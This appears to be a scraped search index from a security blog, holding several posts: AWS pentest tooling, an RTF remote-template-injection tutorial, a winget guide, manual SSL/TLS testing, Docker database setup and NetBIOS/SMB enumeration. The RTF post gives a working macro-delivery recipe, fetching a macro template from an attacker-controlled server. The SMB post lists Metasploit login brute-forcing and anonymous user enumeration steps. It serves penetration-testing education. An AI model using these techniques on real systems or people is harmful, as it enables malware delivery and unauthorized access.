EscalationPmapper tool by NCCPacu&lt;a href=”https://github.com/RhinoSecurityLabs/pacu” target=”_blank” class=”external” title=”Pacu Tool By Rhino Security Labs” rel=”nofollow”&gt;Pacu Tool By Rhino Security Labs&lt;/a&gt;Installing Pacupip3 install pippip3 install -U pacupacuEnumeration of the root user. Can be done manually but after a few attempts, it requires a captcha.Enumeration of Account ID viaIAM -&gt; Roles &gt; Elevate-S3 &gt; Edit trust policyThe team over at Rhino Security have a great write up on how to enumerate users via this process. &lt;a href=”https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/” target=”_blank” class=”external” title=”AWS IAM User Enumeration” rel=”nofollow”&gt;Rhino Security Labs - AWS IAM User Enumeration&lt;/a&gt;Steam PipeRunning SteamPipesteampipe check benchmark.cis_v140 --export=report.html --export=report.csvProwlerRunning Prowler. Use the -p flag to specify API profile to use./prowler -p &lt;profile_name&gt;Use ansi2html if you want an HTML reportpip install ansi2html./prowler -p &lt;profile_name&gt; | ansi2html -la &gt; report.htmlAssessing AWS The following is a very generic methodology you can use until you refine your own approach via experience. Launch Scout Suite to collect configuration data and initial list of issues Launch prowler and collect list of issues Review Trusted Advisor (if available for the account)" }, { "title": "RTF Template Injection", "url": "/posts/rtf-template-injection/", "categories": "article", "tags": "exploit-development, rtf", "date": "2022-02-09 00:00:00 +0000", "snippet": "In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened. “Hold on… I can use the Start menu to do that. Why should...", "content": "In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened. “Hold on… I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.What is an RTF file?Tapping away in front of your Macintosh or the early versions of Windows, did you ever wonder what those .rtf files (Rich Text Format) were that you ever so occasionally encountered? The ones that were opened up with text editors (featuring a horizontal ruler) other than your trusted notepad?RTF traces back to the late 1980s when it was developed and released. Rich text format files, as opposed to plain text files, can contain images, different font styles, formatting, and more. They are interoperable, which means they can be processed by a wide range of technologies, making them a portable file type.Why should I care?“Why should I care?” you might wonder. The short answer is that with little modification, this technique can be leveraged to spread malicious macros in otherwise benign RTF files - as actively being done by threat actor groups online. Within RTF files, specific control words (see http://latex2rtf.sourceforge.net/rtfspec_62.html for more) are used. These control words are specially formatted commands that instruct applications how to handle the file. Let us get started!Instructions - RTF template injection with a calculator pop-upIn this example, we will demonstrate how to use the “template” control word to cause an RTF file to fetch another file from a web server controlled by us. This example makes use of the template editing capabilities of RTF files, as well as the ability to fetch resources from a specified URL. The code we will use opens up a calculator on a Windows-based operating system when the RTF file is run. Note that macros will require enabling on your system.Step 1 - Create a macro-enabled Word template fileThis file will contain our macro that executes the calculator app when the RTF file is opened.Open Word and add the following Visual Basic code (macro) to it. Save the file as calc.dotm.Sub AutoOpen()Dim Program As StringDim TaskID As DoubleProgram = \"calc.exe\"TaskID = Shell(Program, 1)End SubIf you are unfamiliar with creating Word template files, we recommend checking out Microsoft’s documentation on them: https://support.microsoft.com/en-us/office/save-a-word-document-as-a-template-cb17846d-ecec-49d4-82ea-a6f5e3e8b9ae.Step 2 - Start a web serverLaunch an HTTP server in the folder containing the ‘calc.dotm’ file using your preferred method. If you are using Python 3, you can use the following command with the port number of your choice.python3 -m http.server &lt;port number&gt;Step 3 - Create a benign RTF fileGet or make a simple RTF file. We will modify this in the next step to fetch our macro-enabled template file from the web server launched.There are sample RTF files you can use available online. Please always have your anti-virus solution enabled when downloading files from the Internet.Step 4 - Add remote template fetching capabilities to the RTF fileUse a HEX editor to open the RTF file created in the previous step. I used Hex Editor Neo.Look for a pre-existing enclosing group for a font family control word (for example, Times New Roman if your file uses it). Insert the following text after the font’s ending tag with your listening IP and port + payload/file to fetch.{\\*\\template http://&lt;your-IP&gt;:&lt;port number&gt;/calc.dotm}Step 5 - Show timeSave the changes and open the RTF file in its default application. If you are a Windows user, this will likely be Word. The remote file will be loaded from your web server and used to launch the calculator program when the RTF file is opened.The below screen capture displays the macro-enabled template file being fetched.The below screen capture displays the RTF file opened and the calculator app launched.Well that was easy… Where to from here?I hope this article has served as a foundation for your further explorations. Why not look into creating your custom macro-enabled template files next?" }, { "title": "A Guide On How To Winget", "url": "/posts/guide-how-winget/", "categories": "tutorial", "tags": "winget", "date": "2022-02-09 00:00:00 +0000", "snippet": "Winget is the name of Microsofts new package manager. A package manager is a tool designed to help you quickly search for and install other tools that your operating system supports. Windows user...", "content": "Winget is the name of Microsofts new package manager. A package manager is a tool designed to help you quickly search for and install other tools that your operating system supports. Windows users have waited a long time for a native package manager offering from Microsoft. Until now the best offering has been chocolatey; however, after exploring some of the features I will show you in this tutorial I have made the switch. Winget does not come installed by default. There are several ways to install it Microsoft Store Release On Github Being a Member of the Windows Insiders Program (Free but may take time to appear as an install option.) Winget only supported on certain OS Versions.@todo: Enter OS that Winget Supports Because you will be using Winget to install the software you typically need to open up the console as an Administrator.In this tutorial, we will be installing from Github however you can just as easily install this from the Windows Store if you have it enabled. It can take a few days for the option to install Winget to appearI will be installing this release https://github.com/microsoft/winget-cli/releases/tag/v1.2.10271After you click to download you can install by selecting open. This saves you having to save to disk, find the file and then having to click again to install.Windows will now install winget. We can verify this by seeing the versionwinget --versionThe first time you actually use Winget for anything other than verifying its version you will see an agreement acceptance response like that below.We can list packages currently installed on our machine.winget listWe can query these packageswinget list -q &lt;term&gt;We can show only the first n number of resultswinget list -n 10Searching for new packageswinget search &lt;term&gt;If you look at the last example you can see Winget searching for packages from two sources. We can list the sources that Winget knows about.winget source list Note you can install additional sources but that is out of scope for this tutorial. This is just a crash course to get you started.We can also inspect a source.Okay, let us go back to searching. This time we will limit our search to a source.We can also search by Tagwinget search --tag githubWe will now look at installing packages. We will look at a worked example using Microsoft Visual Studio Code.First, we will search.The top result looks like what we want. We can use the show subcommand to find more information.If you look at the arrow we can see the package has a moniker. Typing Microsoft.VisualStudioCode with the install command would work but it is a lot to type. Instead, we can reference the package using the moniker.We can now install the packagewinget install vsscodeGreat so our package is now installed.When installing you may see UI windows open like in the screenshot below.We can prevent that happening, however.First I will show you how to uninstall a package and then we will install it a second time without the UI prompts.Uninstallingwinget uninstall Github.cliInstalling with the --silent flag.I have gone ahead and installed a few other programs and I like the collection of packages I have installed. What if I wanted to save this combination of packages for installation on another machine.winget export -o &lt;file path&gt;We can see that some Windows Packages do not have packages available in the Microsoft Store or in the Winget repository.Let us check the file we saved. Here it is where we specified on the desktop.If we look inside we can see the file is in JSON and we can see a collection of packages I have installed.I have removed some of the packages I installed but not all. Now I want to get the system up to sync.As Winget gets to packages that are either not installed or have upgrades it gets to work." }, { "title": "Vulnerabilities in SSL & TLS :- Manually Testing", "url": "/posts/vulnerabilities-ssl-tls-manually-testing/", "categories": "article", "tags": "ssl, tls", "date": "2022-02-03 00:00:00 +0000", "snippet": "OpenSSL For TestingAs OpenSSL has improved, it has become more challenging to use one binary for testing the full range of modern to legacy SSL/TLS configurations. The reason for that is following ...", "content": "OpenSSL For TestingAs OpenSSL has improved, it has become more challenging to use one binary for testing the full range of modern to legacy SSL/TLS configurations. The reason for that is following Heartbleed; the OpenSSL developers started a significant overhaul, part of which included the elimination of outmoded cryptography. While this is fantastic news for customers from now on; it means we may need to employ two versions of the OpenSSL binary during our engagements to test for a wide range of conditions: one binary for the new features such as TLS v1.3 and one binary for testing old protocols and Cipher configurations such as when testing if a service supports SSL v2.0.We can compile out own version of OpenSSL for testing legacy environments. If we start with the OpenSSL 1.0.2g source code, we can make the static binary as follows.::textcd /tmpwget https://openssl.org/source/openssl-1.0.2g.tar.gzgunzip openssl-1.0.2g.tar.gztar -xvf openssl-1.0.2g.tarcd /tmp/openssl-1.0.2g/./config --prefix=/opt/openssl-1.0.2g --openssldir=/opt/openssl-1.0.2g no-shared enable-ssl2 enable-ssl3 enable-weak-ssl-ciphersmake depend make allWe can now test what we have compiled and make sure we are referencing the correct binary for our needs. If we supply the openssl binary with no options, we should be presented with an interactive prompt. To confirm the OpenSSL version, type as follows./opt/openssl-1.0.2g/bin/openssl OpenSSL&gt; versionOpenSSL 1.0.2g 1 Mar 2016OpenSSL&gt; We can compare that to my current binary in Kali Linux./usr/bin/openssl OpenSSL&gt; versionOpenSSL 1.1.1l 24 Aug 2021OpenSSL&gt; We can see that OpenSSL 1.0.2g was released 1 March 2016, and version 1.1.1l was released 24 August 2021. Using the openssl ciphers syntax, we see more than just a version number,date and release separating these binaries. Number of Ciphers Supported Between Versions 1.1.1l and 1.0.2gConnectingOpenSSL provides different features and tools for SSL/TLS related operations. We can see a list of these standard commands running the following syntax.openssl list-standard-commandsCropped Image of OpenSSL Binary Listing Standard CommandsAs can be seen, the OpenSSL binary provides many different features and tools for operations related to working with the TLS and SSL protocol. One of these tools, the s_client tool, connects, checks, and lists HTTPS and TLS/SSL-related information. We can assess services using SSL or TLS encryption for our customers using this tool. But first, let us look at its basic usage.We will look at one of the most common uses for using the OpenSSL s_client tool, connecting to a remote TLS/SSL website. We provide it with a target and a port number to do this.::text/opt/openssl-1.0.2g/bin/openssl s_client -connect evilsaint.com:443This command connected to the evilsaint.com web server on port 443, attempted a full TLS/SSL handshake, and then printed out the following information. The connection status Chain Verification Status3 The certificate chain the server sent 4 The peer certificate in base64 encoded format5 Details regarding the rest of the handshake.As we move on to expanding on this example it might be prudent to talk about the -connect switch. The connect switch can take any TCP IP address or FQDN. If we looked up the IP address for evilsaint it would show as 192.248.151.138. We could replace the evilsaint.com with the resolved IP address and it would still reach out to attempt a handshake with the webserver.::text/opt/openssl-1.0.2g/bin/openssl s_client -connect 192.248.151.138:443What if the IP address we were connecting to hosted multiple websites? If we take a look at the following Apache Web Server configuration example (below), we can see there is run server running on the IP Address 172.20.30.40 and there are two domains ‘www.example.com’ and ‘www.example.org’.# This is the \"main\" server running on 172.20.30.40ServerName server.example.comDocumentRoot \"/www/mainserver\"&lt;VirtualHost 172.20.30.50&gt; DocumentRoot \"/www/example1\" ServerName www.example.com # Other directives here ...&lt;/VirtualHost&gt;&lt;VirtualHost 172.20.30.50&gt; DocumentRoot \"/www/example2\" ServerName www.example.org # Other directives here ...&lt;/VirtualHost&gt;Just how if you configured virtual hosting with Apache, you would use the domain name to distinguish between multiple websites hosted on the same server. We can do the same with the -servername flag. The -servername flag lets us set the Server Name Indication (SNI) in the ClientHello message to the given value. The -connect switch is used to establish the TCP connection and can be a FQDN or IP address. The -servername is used to specify the domain hostname. If the -servername option is empty then openssl sends the same DNS name as what is used for the -connect option. If an IP is specified for the -connect option and the -servername is not provided then the default behaviour since OpenSSL 1.1.1 is to set SNI is to “localhost”.Here are two examples demonstrating the same IP address but specifying two different domains.::textopenssl s_client -servername domain.com -connect X.X.X.X:443openssl s_client -servername domain2.com -connect X.X.X.X:443Let us move on and discuss a few more switches that can aid our queries. -crlf -showcertsThe addition of the -crlf flag. This flag translates line feeds from your terminal into character return &amp; line feeds (CR+LF) that are required by some servers. The -showcerts option can be useful when you need to see all certificates returned from the server.Let us look at an example::text/opt/openssl-1.0.2g/bin/openssl s_client -crlf -showcerts -connect evilsaint.com:443 -servername www.evilsaint.comAutomated TestingThe purpose of this article is to look at ways of manually testing for TLS/SSL weaknesses and so for the most part I want to avoid discussion on popular tools such as testssl, sslyze and sslscan. With that said, after seeing the support for various ciphers and protocols change between versions of the OpenSSL binary versions I am sure there will be those that are interested in how these tools over come this problem and would like to make sure they are testing using a particular version of OpenSSL.TestsslTestssl is a bash script that is a direct wrapper around the openssl binary. When you start any scan the output will tell you which version of the binary it used to complete its tests. To change the binary that testssl uses we can enter it as an option when running the command.::texttestssl.sh openssl=/path/to/openssl &lt;URI&gt;Let us compare the default system binary to our newly compiled one.::texttestssl --openssl=/opt/openssl-1.0.2g/bin/openssl https://evilsaint.comSupport for ~142 Ciphers testssl https://evilsaint.comSupport for ~81 CiphersSSLScanIf you complete the following on a terminal you will likely find that SSL Scan has been compiled to use the local system binary and there doesn’t appear to be an option for sepcifying the openssl binary.sslscan --version All however is not lost. SSL Scan 2 has had a major backend code rewrite which means it is no longer reliant on the version of OpenSSL for many of the checks it performs. Meaning it is possible to support legacy protocols such as SSLv2 and SSLv3 regardless of the version of OpenSSL that is has been compiled against.SSLyzeSSLyze is an nearly all Python code project but similar to other tools it requires access to low-level OpenSSL functionality. In order to satisfy this the author has created an OpenSSL wrapper written in C code which is called nassl. This was specifically developed for SSLyze.Manually Testing For VulnerabilitiesCheck For SSL v2 SupportIn addition to the vulnerabilities support for Version 2 of SSL allows it should be noted that in terms of real life practicality, Microsoft has stopped supporting SSL 2.0 in the Windows 10 operating system and IE6 was the last browser that supported SSL version 2 by default. There should be very little reason, if any, to support SSL version 2.0To check whether SSLv2 is enabled on the remote host, the following command can be used:::text/opt/openssl-1.0.2g/bin/openssl s_client -ssl2 -connect evilsaint.com:443If SSLv2 is supported, the handshake will complete and server certificate information will be returned.Alternatively to using the OpenSSL command line tool that you can try and use Curl.curl --sslv2 -I evilsaint.com:443Check the output, you want to see something similar to the following:* SSL peer handshake failedAs opposed to* SSL 2.0 connection using SSL_NULL_WITH_NULL_NULLCheck For SSL v3 SupportTo test whether a system supports SSLv3, the following OpenSSL command can be used:::textopenssl s_client --sslv3 -connect evilsaint.com:443If SSLv2 is supported, the handshake will complete and server certificate information will be returned.Alternatively to using the OpenSSL command line tool that you can try and use Curl.::textcurl --sslv3 -I evilsaint.com:443Check the output, you want to see something similar to the following:* SSL peer handshake failedAs opposed to* SSL 3.0 connection using SSL_NULL_WITH_NULL_NULLCipher Suitesopenssl s_client -cipher::textnmap --script ssl-enum-ciphers -p 443 example.comServer Certificate::textopenssl s_client -connect example.com:443 | openssl x509 -noout -textSecure RenegotiationThe following demonstrates how to verify if a system supports secure renegotiation.::textopenssl s_client -connect example.com:443Client Initiated RenegotiationThe following demonstrates how to check if client initiated renegotiation is supported.::textopenssl s_client -connect example.com:443Once the connection is established, the server will wait for us to type the next command. We can write the following two lines in order to initiate a renegotiation by specifying R in the second line, followed by enter or return.::textopenssl s_client -connect host:portHEAD / HTTP/1.0R&lt;Enter or Return key&gt;TLS CompressionTo test whether a server supports TLS compression, and is vulnerable to CRIME, the following method can be used:::textopenssl s_client -connect example.com:443For servers that have TLS compression disabled, the response will be similar to the following. The “Compression: NONE” shows that this server rejects usage of TLS-level compression.HTTP CompressionTo test whether a server supports deflate or compression, the following steps can be performed:::textopenssl s_client -connect example.com:443Submitting the following will allow us to see if HTTP compression is supported by the server.GET / HTTP/1.1Host: example.comAccept-Encoding: compress, gzipChange Cipher Spec InjectionA weakness exists in some versions of OpenSSL which can be exploited by intermediary third parties in order to retrieve sensitive information from encrypted communication.Affected Versions:• OpenSSL 1.0.1 through 1.0.1g• OpenSSL 1.0.0 through 1.0.0l• all versions before OpenSSL 0.9.8yTesting requires using publicly available tools, such as the the ‘ssl-ccs-injection’ nmap script by Claudiu Perta, which can be used to test for this vulnerability. This script can be downloaded from https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html.::textnmap -p 443 --script ssl-ccs-injection example.comHeartbeat - TLS Extension::textopenssl s_client –tlsextdebug" }, { "title": "Learn MSSQL and PostgreSQL with Docker", "url": "/posts/learn-mssql-and-postgresql-docker/", "categories": "tutorial", "tags": "database, docker, mssql, postgresql, psql, sqlcmd", "date": "2022-02-01 00:00:00 +0000", "snippet": "In this tutorial, we will be using Docker to spin up database containers for us to enumerate. There are many articles on setting up and installing docker on your favourite platform so this tutorial...", "content": "In this tutorial, we will be using Docker to spin up database containers for us to enumerate. There are many articles on setting up and installing docker on your favourite platform so this tutorial will start from the point where docker is already installed.Installing DatabasesFor this tutorial, we will be using Docker containers for MSSQL Server 2019 and PostgreSQL 14.The official docker hub page for Microsoft MSSQL Server 2019 and PostgreSQL are located at the following URL. https://hub.docker.com/_/microsoft-mssql-server https://hub.docker.com/_/postgres/Before we start configuring our containers we should touch on some basics. If we use the docker pull command we can pull a Docker image from the Docker hub to our machine. Pulling an image just gives us access to that image for when we need it. If however, we use the command docker run it will check if the image has already been pulled and if it hasn’t been pulled previously this will pull the image and then run itMost docker installation guides take the user through the process of installing Docker and then running a “Hello World” example. The following example is the Docker equivalent of a programmers “Hello World” script$ docker run hello-worldUnable to find image 'hello-world:latest' locallylatest: Pulling from library/hello-world1b930d010525: Pull complete Digest: sha256:6f744a2005b12a704d2608d8070a494ad1145636eeb74a570c56b94d94ccdbfcStatus: Downloaded newer image for hello-world:latestWe can see that when we used the docker run command that Docker was “Unable to find ‘hello-world:latest’ locally” so it made a pull.Microsoft SQL ServerRunning MSSQL Server 2019docker run --name sqlserver2019 -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=Password123' -p 1433:1433 -d mcr.microsoft.com/mssql/server:2019-latestCompared to the simple “Hello World” example we just looked at we can see the MSSQL Database requires a few more command-line arguments.docker run –name sqlserver2019-2 -e ‘ACCEPT_EULA=Y’ -e ‘SA_PASSWORD=Password123’ -p 2433:1433 -d mcr.microsoft.com/mssql/server:2019-latestPostgreSQLdocker run –name postgresql -p 5432:5432 -e POSTGRES_PASSWORD=Password123 -d postgres:latestdocker run –name postgresql -p 6432:5432 -e POSTGRES_PASSWORD=Password123 -d postgres:latestInteracting with Microsoft SQL ServerLog into sqlserver2019 docker containerdocker exec -it sqlserver2019 bashView OS informationcat /etc/os-releaseLog into SQL Server using SQLCMD command line tool/opt/mssql-tools/bin/sqlcmd -U sa -P Password123View version informationSELECT @@Version;GOList databases currently on the serverSELECT name FROM sys.databases;GOCreate a new databaseCREATE DATABASE evilsaint;GOQuit SQLCMD CLI toolexitExit out of the docker containerexitPostgreSQLLog into postgresql docker containerdocker exec -it postgresql bashView OS informationcat /etc/os-releaseLog into PosgreSQL server using PSQL command line toolpsql -U postgresView help documentationhelpList databases currently on the server\\lCreate a new databaseCREATE DATABASE evilsaint;Quit PSQL CLI tool\\qExit out of the docker containerexitRun postgresql database 2 for bruteforcedocker exec postgresql-2 bashDocker Commandsview all running containersdocker psview all containers regardless of statusdocker ps -astop a containerdocker stop sqlserver2019start a containerdocker start sqlserver2019remove a containerdocker rm sqlserver2019" }, { "title": "Protocol Dissection :- NetBIOS & SMB", "url": "/posts/protocol-dissection-netbios-smb/", "categories": "article", "tags": "netbios, smb", "date": "2022-01-28 00:00:00 +0000", "snippet": "##What is NetBIOS?NetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model, allowing applications on separate computers to com...", "content": "##What is NetBIOS?NetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model, allowing applications on separate computers to communicate over a local area network.NetBIOS is an API and not a networking protocol.##How does NetBIOS operate?Older operating systems ran NetBIOS using the NetBIOS Frames (NBF) and NetBIOS over IPX/SPX (NBX) protocols.In modern networks, NetBIOS normally runs over TCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in the network having both an IP address and a NetBIOS name corresponding to a (possibly different) host name.##What are the benefits of NetBIOS?NetBIOS provides three distinct services: Name service (NetBIOS-NS) for name registration and resolution. Datagram distribution service (NetBIOS-DGM) for connectionless communication. Session service (NetBIOS-SSN) for connection-oriented communication.##What is SMB?N.B. SMB, an upper layer, is a service that runs on top of the Session Service and the Datagram service, and is not to be confused as a necessary and integral part of NetBIOS itself. It can now run atop TCP with a small adaptation layer that adds a packet length to each SMB message; this is necessary because TCP only provides a byte-stream service with no notion of packet boundaries##How does SMB operate?SMB can run on top of the Session (and lower) network layers in several ways: Directly over TCP, port 445 Via the NetBIOS API on UDP ports 137, 138 &amp; TCP ports 137, 139 (NetBIOS over TCP/IP);##What are the benefits of SMB?The SMB “Inter-Process Communication” (IPC) system provides named pipes and was one of the first inter-process mechanisms widely available to programmers, allowing services to inherit the authentication performed when a client first connected to an SMB server.Since Windows 2000, SMB has been running with a thin layer on top of TCP, similar to the Session Message packet of NBT’s Session Service, using TCP port 445 rather than TCP port 139; this is known as “direct host SMB.”SMB VersionsVersion Summary: SMB1 – Windows 2000, XP and Windows 2003. SMB2 – Windows Vista SP1 and Windows 2008 SMB2.1 – Windows 7 and Windows 2008 R2 SMB3 – Windows 8 and Windows 2012.SMB 2.0Microsoft introduced a newer version of the protocol (SMB 2.0 or SMB2) with Windows Vista in 2006SMB 2.1With Windows 7 and Server 2008 R2, a new opportunistic locking mechanism was introduced, resulting in minor performance improvements.SMB 3.0 (previously SMB 2.2)Was introduced with Windows 8 and Windows Server 2012.SMB 3.0.2Introduced with Windows 8.1 and Windows Server 2012 R2. In 3.0.2, the earlier SMB version 1 can be optionally disabled to increase security.SMB 3.1.1Debuted alongside Windows 10 and Windows Server 2016. This version adds AES 128 GCM encryption to the AES 128 CCM encryption introduced in SMB3, as well as a pre-authentication integrity check using the SHA-512 hash. SMB 3.1.1 also requires secure negotiation when connecting to clients that use SMB 2.x or higher.Security Flaws WindowsThere have been numerous security flaws in Microsoft’s implementation of the protocol or the components on which it directly relies over the years.Other vendors’ security flaws stem primarily from a lack of support for newer authentication protocols such as NTLMv2 and Kerberos in favour of NTLMv1, LanMan, or plaintext passwords. Real-time attack tracking reveals that SMB is a primary attack vector for intrusion attempts, such as the Sony Pictures attack in 2014.NetBIOS is effectively becoming a legacy protocol in client-server networks based on post-MS Windows 2000 / NT. NetBIOS was also designed for non-routable local area networks. NetBIOS effectively provides backwards compatibility for network devices that predate DNS compatibility in most post-2000 networks running Windows 2000 or later. NetBIOS’s primary role in Client-Server networks (as well as those with networked peripheral hardware that predates DNS compatibility) is to provide name resolution to computers and networked peripherals. Furthermore, it enables the access and sharing of networked hardware, as well as the mapping and browsing of network folders, shares, and shared printers, faxes, and so on. Its primary function is to provide name resolution to a computer and shared folders via a session-layer protocol transported over TCP/IP. As a result, Windows 2000-based Client-Server networks - and later - do not require this insecure method of name resolution, addressing, or navigating network shares.Security Flaws in Samba:Some versions of Samba 3.6.3 and lower have serious security flaws that can allow anonymous users to gain root access to a system via an anonymous connection by exploiting an error in Samba’s remote procedure call.Badlock, a critical security flaw in Windows and Samba, was publicly disclosed on April 12, 2016. CVE-2016-2118 mentions Badlock for Samba (SAMR and LSA person-in-the-middle attacks are possible).Null Sessions In Windows 2000 and Windows NT, null sessions are enabled by default. They are also enabled by default in Windows XP and Windows 2003 Server, but they do not support user account enumeration.SMB Programssmbcacls - Set or get ACLs on an NT file or directory names/usr/bin/smbcacls smbclient - ftp-like client to access SMB/CIFS resources on servers/usr/bin/smbclientsmbcontrol - send messages to smbd, nmbd or winbindd processes/usr/bin/smbcontrol smbcquotas - Set or get QUOTAs of NTFS 5 shares/usr/bin/smbcquotas smbget - wget-like utility for download files over SMB/usr/bin/smbget /usr/bin/smbmap smbpasswd - The Samba encrypted password filesmbpasswd - change a user’s SMB password/usr/bin/smbpasswd smbspool - send a print file to an SMB printer/usr/bin/smbspool smbstatus - report on current Samba connections/usr/bin/smbstatus smbtar - smbtar - shell script for backing up SMB/CIFS shares directly to UNIX tape drives/usr/bin/smbtar smbtree - A text based smb network browser/usr/bin/smbtree Others:/usr/bin/dceoversmb /usr/bin/pth-smbclient /usr/bin/pth-smbget SmbtreeShow smbtree versionsmbtree --version Show all workgroupssmbtree Nbtscan vs NbtstatThe difference between nbtstat and nbtscan in Windows is that nbtscan can work with multiple IP addresses.To determine the meaning of each service in the NetBIOS report, visit Microsoft Knowledge Based on NetBIOS Suffixes (16th Character of the NetBIOS Name) at: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brws/0c773bdd-78e2-4d8b-8b3d-b7506849847bNbtscannbtscan is an abbreviation for ‘NetBIOS over TCP scanner.This is a command-line tool that searches for open NetBIOS nameservers on a local or remote TCP/IP network, which is the first step in discovering open shares. It is based on the functionality of the standard Windows tool nbtstat, but instead of just one address, it operates on a range of addresses.Scanning the networkThis scan will return the IP address of the computer(s), the NetBIOS name, the current logged in user, and the mac address of all NetBIOS on the local subnet.nbtscan 10.11.1.1-254nbtscan 110.11.1.0/24Examining one hostOnce we have decided on a host, we can enter just one host for more information.nbtscan -hv 10.11.1.5The -h makes the output services human-readable and the -v gives a verbose output.If instead you would like to see a dump of the packets you can use the -d option but it can not be used with the -v or -d.nbtscan -d 10.11.1.5Sometimes you may want to grep the results and so the -s flag can come in handy to put a separator between the fields.Pipe as a separator:nbtscan -vh -s \"|\" 10.11.1.0/24Colon as a separator:nbtscan -vh -s : 192.168.1.0/24Finally, we may want to enter the IP addresses of hosts to scan, which we can do as follows.nbtscan -f iplist.txtAdditional FlagsAs per the man page, the following three flags sometimes can be useful.Bandwidth output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that outgoing queries do not get dropped.nbtscan -b 1000 10.11.1.5Use local port 137 for scans. Win95 boxes respond to this only. You need to be root to use this option on Unix.nbtscan -r 10.11.1.0/24Suppress banners, headers and error messages.nbtscan -q 10.11.1.0/24NmblookupUse this on a single IP address for greater detail following the nbtscan.Do a node status on as an IP address:nmblookup -A &lt;ip address&gt;To find the IP address of a computer given its computer name, we can use:nmblookup &lt;computer name&gt;To find the group the computer belongs to and its MAC address:nmblookup -S &lt;computer name&gt;For example, lines containing ‘&lt;00&gt;’ in the output of ‘nmblookup -S ' can be interpreted as follows. The one that is not followed by group is the computer name, and the one that is is the workgroup name to which this computer belongs.To find IP addresses of all computers in a workgroup, we can use:nmblookup &lt;workgroup name&gt;If we want computer names along with IP addresses, then we can use:nmblookup -S &lt;workgroup name&gt;Workgroup Flags workgroup &lt;00&gt; group - This name is a remnant of the original LAN Manager browse service. workgroup &lt;1D&gt; unique - This name identifies the Local Master Browser (LMB, sometimes called simply “Master Browser”) for a subnet. workgroup &lt;1E&gt; - group A node that is capable of acting as a “Browser” registers this group name to listen for election announcements. nt_domain &lt;1B&gt; unique Name registered by the Domain Master Browser. Must be registered with the NBNS in order to be of any real use. nt_domain &lt;1C&gt; Internet group Registered by all Domain Controllers in the given NT Domain.NmapNmap scripts for SMB are located at:ls -l /usr/share/nmap/scripts/smb*ls -lsa /usr/share/nmap/scripts | grep \"smb\"ls /usr/share/nmap/scripts | grep \"smb\" | sed \"s/.nse/,/\" | tr -d \"\\n\\r\"The below scripts are available to us.smb-brute,smb-enum-domains,smb-enum-groups, smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-flood,smb-ls,smb-mbenum, smb-os-discovery,smb-print-text,smb-psexec, smb-security-mode,smb-server-statssmb-system-info,smbv2-enabled,smb-vuln-conficker,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029smb-vuln-ms08-067, smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dosWe start off by seeing which SMB ports are open (the --open switch is used in order to show only open ports).nmap -p 139,445 192.168.1.0/24 --openWe can also do basic SMB Vulnerability Checking.nmap -p T:137,139,445,U:137,139,445 --script=vulns --script-args=unsafe=1 192.168.1.111Discover network shares with NmapAfter a list of shares is found, the script attempts to connect to each of them anonymously, which divides them into “anonymous”, for shares that the NULL user can connect to, or “restricted”, for shares that require a user account. https://nmap.org/nsedoc/scripts/smb-enum-shares.htmlUse the smb-os-discovery.nse script to discover NetBIOS computer name. The reason for this is that a computer named maria-pc, most likely to have a user named maria, so you can use it during brute forcing phase.nmap --open -sS -sV --script smb-enum-shares.nse,smb-os-discovery.nse -p445,139 10.11.1.1/24Enum4linuxEnum4linux is a wrapper for smbclient, rpcclient, net and nmblookup. http://labs.portcullis.co.uk/tools/enum4linux/Verbose mode, shows the underlying commands being executed by enum4linux and is a great way to learn what the tool is running behind the scenes.enum4linux -v &lt;target-ip&gt;Do Everything, runs all options apart from dictionary based share name guessing. (-U -S -G -P -r -o -n -i). This opion is enabled if you don’t provide any other options.enum4linux -a &lt;target-ip&gt;Lists usernames, if the server allows it - (RestrictAnonymous = 0).enum4linux -U &lt;target-ip&gt;If you have managed to obtain credentials, you can pull a full list of users regardless of the ‘RestrictAnonymous’ option.enum4linux -u administrator -p password -U &lt;target-ip&gt;Pulls usernames from the default RID range (500-550,1000-1050).enum4linux -r &lt;target-ip&gt;Pull usernames using a custom RID range.enum4linux -R 600-660 &lt;target-ip&gt;Lists groups. if the server allows it, you can also specify username -u and password -p.enum4linux -G &lt;target-ip&gt;List Windows shares, again you can also specify username -u and password -penum4linux -S &lt;target-ip&gt;Perform a dictionary attack, if the server does not let you retrieve a share listenum4linux -s shares.txt &lt;target-ip&gt;Pulls OS information using smbclient, this can pull the service pack version on some versions of Windowsenum4linux -o &lt;target-ip&gt;Pull information about printers known to the remove device.enum4linux -i &lt;target-ip&gt; RpcclientConnect to anonymous SMBroot@kali:~# rpcclient -U \"\" 10.20.50.80Enumerate domain usersrpcclient $&gt; enumdomusersuser:[nobody] rid:[0x1f5]user:[user] rid:[0x3e8]user:[root] rid:[0x3e9]Convert names to SIDsrpcclient $&gt; lookupnames rootroot S-1-5-21-2814459928-1332494333-2211073762-1001 (User: 1)Convert SIDs to namesrpcclient $&gt; lookupsids S-1-5-21-2814459928-1332494333-2211073762-1001Query user inforpcclient $&gt; queryuser 1001MetasploitBrute Force SMB Loginmsfconsoleuse auxiliary/scanner/smb/smb_loginset RHOSTS 192.168.1.5set SMBUser administratorset PASS_FILE /root/Documents/passwords_listset THREADS 10runMetasploit ModuleThe pipe_auditor scanner will determine which named pipes are available over SMB. This can provide you with some insight into some of the services that are running on the remote system during your information gathering stage.msf&gt; use scanner/smb/pipe_auditorSmbclientThe -N switch indicates that we do not have a root password for this connection.smbclient -L 192.168.75.14 -NThe above might show us the Samba or Windows server version that we can look in exploit DB.This allows us to login to shares.smbclient //host/shareMount discovered sharesmbclient //MOUNT/share -I target -NList the contents of a sharesmbclient -L \\\\RALPH -I 10.11.1.31 -Nsmbclient -L \\\\MAILSLOT\\Browser -I 